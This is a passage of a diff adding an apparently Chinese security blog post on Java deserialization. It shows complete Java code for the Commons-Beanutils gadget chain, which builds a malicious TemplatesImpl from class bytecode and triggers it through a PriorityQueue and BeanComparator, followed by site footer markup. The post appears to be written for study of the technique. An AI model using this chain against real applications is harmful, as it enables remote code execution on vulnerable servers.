+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;a&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Files</span><span class="p">.</span><span class="na">readAllBytes</span><span class="p">(</span><span class="n">Paths</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;D:\\1\\代码集合\\java代码\\CB\\src\\main\\java\\org\\example\\test.class&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[][]</span><span class="w"> </span><span class="n">codes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">code</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="n">codes</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanComparator</span><span class="w"> </span><span class="n">comparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanComparator</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PriorityQueue</span><span class="w"> </span><span class="n">priorityQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">comparator</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">priorityQueue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;property&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;outputProperties&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">,</span><span class="s">&#34;queue&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">templates</span><span class="p">,</span><span class="n">templates</span><span class="p">});</span><span class="c1">// 设置BeanComparator.compare()的参数,修改成恶意TemplateImpl 对象,queue 字段是数组类型,所以这里这里是数组</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;comparator&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">priorityQueue</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">(</span><span class="s">&#34;CC4.txt&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">field_name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">field_value</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">object</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">field_name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">field_value</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//定义序列化操作</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;CC4.txt&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//定义反序列化操作</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然还一种写法就是实例化<code>BeanComparator</code>传入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">BeanComparator</span><span class="w"> </span><span class="n">comparator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanComparator</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/cc7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cc7</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cc5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cc5</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cc2/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cc2</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cc4/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cc4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/polarctf-java%E9%A2%98%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">polarctf-java题解</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
